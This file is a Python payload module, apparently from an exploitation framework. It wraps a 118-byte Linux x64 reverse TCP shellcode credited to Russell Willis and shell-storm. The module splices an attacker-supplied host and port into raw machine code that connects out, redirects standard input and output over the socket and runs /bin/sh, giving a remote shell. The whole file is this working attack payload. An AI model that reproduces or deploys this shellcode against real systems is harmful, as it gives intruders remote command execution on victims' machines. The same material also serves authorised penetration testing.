from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Russell Willis"
    Shellcode.info["name"] = "Linux/x64 - reverse_tcp shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-857.php",
    ]
    Shellcode.info["size"] = 118

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
            r"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
            r"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
            + kwargs["lport"] +
            r"\xc7\x44\x24\x04"
            + kwargs["host"] +
            r"\x48\x89\xe6\x6a\x10"
            r"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
            r"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
            r"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
            r"\x5f\x6a\x3b\x58\x0f\x05"
        ]